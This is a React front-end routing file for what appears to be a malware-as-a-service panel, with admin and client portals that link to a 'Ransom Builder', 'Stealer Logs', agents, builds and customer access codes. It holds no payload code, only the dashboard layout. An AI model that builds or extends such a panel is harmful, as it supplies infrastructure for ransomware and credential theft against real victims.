import React, { useState, useEffect } from 'react';
import { BrowserRouter as Router, Routes, Route, Navigate, useLocation, Link } from 'react-router-dom';
import { 
  LayoutDashboard, 
  Users, 
  Activity, 
  FileText, 
  LogOut,
  Menu,
  X,
  ChevronRight,
  Shield,
  Code,
  FileClock,
  Package,
  Key
} from 'lucide-react';

// Admin components
import Login from './components/Login';
import Dashboard from './components/Dashboard';
import Customers from './components/Customers';
import Agents from './components/Agents';
import Builds from './components/Builds';
import Logs from './components/Logs';
import AccessCodes from './components/AccessCodes';
import RansomBuilder from './components/RansomBuilder';

// Client components
import ClientLogin from './components/ClientLogin';
import ClientDashboard from './components/ClientDashboard';
import ClientAgents from './components/ClientAgents';
import ClientBuilds from './components/ClientBuilds';
import ClientLogs from './components/ClientLogs';
import StealerLogs from './components/StealerLogs';

const App = () => {
  return (
    <Router>
      <AppRoutes />
    </Router>
  );
};

const AppRoutes = () => {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const token = localStorage.getItem('token');
    if (token) {
      setIsAuthenticated(true);
    }
    setLoading(false);
  }, []);

  const handleLogout = () => {
    localStorage.removeItem('token');
    setIsAuthenticated(false);
  };

  if (loading) {
    return <div className="flex items-center justify-center h-screen bg-gray-50 text-gray-900">Loading...</div>;
  }

  return (
    <Routes>
      <Route path="/login" element={!isAuthenticated ? <ClientLogin setUser={setIsAuthenticated} /> : <Navigate to="/app/dashboard" />} />
      <Route path="/admin/login" element={!isAuthenticated ? <Login setIsAuthenticated={setIsAuthenticated} /> : <Navigate to="/admin/dashboard" />} />
      <Route path="/app/*" element={isAuthenticated ? <ClientLayout onLogout={handleLogout} /> : <Navigate to="/login" />} />
      <Route path="/admin/*" element={isAuthenticated ? <AdminLayout onLogout={handleLogout} /> : <Navigate to="/admin/login" />} />
      <Route path="*" element={<Navigate to={isAuthenticated ? "/admin/dashboard" : "/admin/login"} />} />
    </Routes>
  );
};

const AdminLayout = ({ onLogout }) => {
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const location = useLocation();

  const navigation = [
    { name: 'Dashboard', href: '/admin/dashboard', icon: LayoutDashboard },
    { name: 'Customers', href: '/admin/customers', icon: Users },
    { name: 'Agents', href: '/admin/agents', icon: Activity },
    { name: 'Builds', href: '/admin/builds', icon: Code },
    { name: 'Ransom Builder', href: '/admin/ransom-builder', icon: Shield },
    { name: 'Access Codes', href: '/admin/access-codes', icon: Key },
    { name: 'Logs', href: '/admin/logs', icon: FileText },
  ];

  const currentPage = navigation.find(item => location.pathname.startsWith(item.href))?.name || 'Dashboard';

  return (
    <div className="flex h-screen bg-gray-50">
      {/* Sidebar */}
      <div className={`
        fixed inset-y-0 left-0 z-50 w-64 bg-white border-r border-gray-200 transform transition-transform duration-300 ease-in-out lg:translate-x-0 lg:static lg:inset-0
        ${sidebarOpen ? 'translate-x-0' : '-translate-x-full'}
      `}>
        <div className="flex flex-col h-full">
          <div className="flex items-center justify-between h-16 px-6 border-b border-gray-200">
            <div className="flex items-center">
              <div className="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center">
                <Shield className="w-5 h-5 text-white" />
              </div>
              <span className="ml-3 text-gray-900 font-semibold">Admin Portal</span>
            </div>
            <button onClick={() => setSidebarOpen(false)} className="lg:hidden p-1 text-gray-400 hover:text-gray-600">
              <X className="w-5 h-5" />
            </button>
          </div>
          <nav className="flex-1 px-4 py-6 space-y-1">
            {navigation.map((item) => (
                <Link
                  key={item.name}
                  to={item.href}
                  className={`flex items-center gap-3 px-3 py-2 rounded-lg text-sm font-medium transition-colors ${location.pathname.startsWith(item.href) ? 'bg-blue-50 text-blue-700' : 'text-gray-700 hover:text-gray-900 hover:bg-gray-50'}`}
                  onClick={() => setSidebarOpen(false)}
                >
                  <item.icon className="w-5 h-5" />
                  {item.name}
                </Link>
            ))}
          </nav>
          <div className="p-4 border-t border-gray-200">
            <div className="flex items-center gap-3 px-3 py-2">
              <div className="w-8 h-8 bg-gray-100 rounded-full flex items-center justify-center">
                <span className="text-xs font-medium text-gray-600">Admin</span>
              </div>
              <div className="flex-1">
                <div className="text-sm font-medium text-gray-900">Admin</div>
                <div className="text-xs text-gray-500">System Administrator</div>
              </div>
            </div>
            <button onClick={onLogout} className="w-full flex items-center gap-3 px-3 py-2 mt-2 text-gray-700 hover:text-gray-900 hover:bg-gray-50 rounded-lg transition-colors">
              <LogOut className="w-5 h-5" />
              <span className="text-sm font-medium">Sign Out</span>
            </button>
          </div>
        </div>
      </div>
      <div className="flex-1 flex flex-col lg:ml-0">
        <header className="bg-white border-b border-gray-200 h-16 flex items-center justify-between px-6">
            <button onClick={() => setSidebarOpen(true)} className="lg:hidden p-2 text-gray-600 hover:text-gray-900">
              <Menu className="w-5 h-5" />
            </button>
            <h1 className="text-lg font-semibold text-gray-900">{currentPage}</h1>
        </header>
        <main className="flex-1 overflow-y-auto p-6">
          <Routes>
            <Route path="/" element={<Navigate to="/admin/dashboard" replace />} />
            <Route path="/dashboard" element={<Dashboard />} />
            <Route path="/customers" element={<Customers />} />
            <Route path="/agents" element={<Agents />} />
            <Route path="/builds" element={<Builds />} />
            <Route path="/ransom-builder" element={<RansomBuilder />} />
            <Route path="/access-codes" element={<AccessCodes />} />
            <Route path="/logs" element={<Logs />} />
            <Route path="*" element={<Navigate to="/dashboard" />} />
          </Routes>
        </main>
      </div>
    </div>
  );
};

const ClientLayout = ({ onLogout }) => {
    const [sidebarOpen, setSidebarOpen] = useState(false);
    const location = useLocation();

    const navigation = [
        { name: 'Dashboard', href: '/app/dashboard', icon: LayoutDashboard },
        { name: 'My Agents', href: '/app/agents', icon: Activity },
        { name: 'My Builds', href: '/app/builds', icon: Code },
        { name: 'Ransom Builder', href: '/app/ransom-builder', icon: Shield },
        { name: 'My Logs', href: '/app/logs', icon: FileClock },
        { name: 'Stealer Logs', href: '/app/stealer-logs', icon: FileText }, // Added new page
    ];
  
    const currentPage = navigation.find(item => location.pathname.startsWith(item.href))?.name || 'Dashboard';

    return (
        <div className="flex h-screen bg-gray-50">
            {/* Sidebar */}
            <div className={`
                fixed inset-y-0 left-0 z-50 w-64 bg-white border-r border-gray-200 transform transition-transform duration-300 ease-in-out lg:translate-x-0 lg:static lg:inset-0
                ${sidebarOpen ? 'translate-x-0' : '-translate-x-full'}
            `}>
                <div className="flex flex-col h-full">
                    <div className="flex items-center justify-between h-16 px-6 border-b border-gray-200">
                        <div className="flex items-center">
                            <div className="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center">
                                <Shield className="w-5 h-5 text-white" />
                            </div>
                            <span className="ml-3 text-gray-900 font-semibold">Client Portal</span>
                        </div>
                        <button onClick={() => setSidebarOpen(false)} className="lg:hidden p-1 text-gray-400 hover:text-gray-600">
                            <X className="w-5 h-5" />
                        </button>
                    </div>
                    <nav className="flex-1 px-4 py-6 space-y-1">
                        {navigation.map((item) => (
                            <Link
                              key={item.name}
                              to={item.href}
                              className={`flex items-center gap-3 px-3 py-2 rounded-lg text-sm font-medium transition-colors ${location.pathname.startsWith(item.href) ? 'bg-blue-50 text-blue-700' : 'text-gray-700 hover:text-gray-900 hover:bg-gray-50'}`}
                              onClick={() => setSidebarOpen(false)}
                            >
                              <item.icon className="w-5 h-5" />
                              {item.name}
                            </Link>
                        ))}
                    </nav>
                    <div className="p-4 border-t border-gray-200">
                        <button onClick={onLogout} className="w-full flex items-center gap-3 px-3 py-2 mt-2 text-gray-700 hover:text-gray-900 hover:bg-gray-50 rounded-lg transition-colors">
                            <LogOut className="w-5 h-5" />
                            <span className="text-sm font-medium">Sign Out</span>
                        </button>
                    </div>
                </div>
            </div>
            <div className="flex-1 flex flex-col lg:ml-0">
                <header className="bg-white border-b border-gray-200 h-16 flex items-center justify-between px-6">
                    <button onClick={() => setSidebarOpen(true)} className="lg:hidden p-2 text-gray-600 hover:text-gray-900">
                        <Menu className="w-5 h-5" />
                    </button>
                    <h1 className="text-lg font-semibold text-gray-900">{currentPage}</h1>
                </header>
                <main className="flex-1 overflow-y-auto p-6">
                    <Routes>
                        <Route path="/" element={<Navigate to="/app/dashboard" replace />} />
                        <Route path="/dashboard" element={<ClientDashboard />} />
                        <Route path="/agents" element={<ClientAgents />} />
                        <Route path="/builds" element={<ClientBuilds />} />
                        <Route path="/ransom-builder" element={<RansomBuilder />} />
                        <Route path="/logs" element={<ClientLogs />} />
                        <Route path="/stealer-logs" element={<StealerLogs />} />
                    </Routes>
                </main>
            </div>
        </div>
    );
};

export default App;
